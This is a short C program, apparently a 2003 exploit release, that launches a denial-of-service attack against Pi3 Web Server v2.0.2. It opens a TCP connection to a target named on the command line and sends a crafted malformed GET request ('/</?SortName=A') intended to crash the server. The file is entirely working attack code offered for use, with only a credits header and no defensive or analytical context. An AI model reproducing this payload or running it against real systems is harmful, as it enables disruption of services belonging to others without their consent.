/*********************************************************************
*
*     Denial of Service Attack against Pi3 Web Server v2.0.2 05/2003
*
*
*    Tripbit Security Development
*    ----------------------------
*
*    Author: posidron
*
*    Contact
*    [-] Mail: posidron@tripbit.org
*    [-] Web: http://www.tripbit.org
*    [-] Forum: http://www.tripbit.org/wbboard
*       [-] IRC: irc.euirc.net 6667 #tripbit
*
*
*    Greets: Rushjo, Tec, STeFaN, Havoc][, MisterMoe
*     Special thx: PeaceTreaty (securecrew.net)
*
*********************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    int port, sockfd;
    struct sockaddr_in server;
    struct hostent *host;

    char sendstring[1024];

    strcpy(sendstring,"GET /</?SortName=A HTTP/1.0\n\n");

    if(argc < 3)
    {
        printf("Usage: %s [target] <port>\n",argv[0]);
        exit(0);
    }

    port = atoi(argv[2]);

    host = gethostbyname(argv[1]);
    if(host == NULL)
    {
        printf("Connection failed!...\n");
        exit(0);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr((char*)argv[1]);

    if( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
    {
        printf("Can't start socket()!\n");
        exit(0);
    }

    if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0)
    {
        printf("Can't connect!\n");
        exit(0);
    }

    printf("Dos against Pi3 Web Server v2.0.2\n");

    write(sockfd,sendstring,strlen(sendstring));

    printf("Attack done!...\n");

    close(sockfd);
}
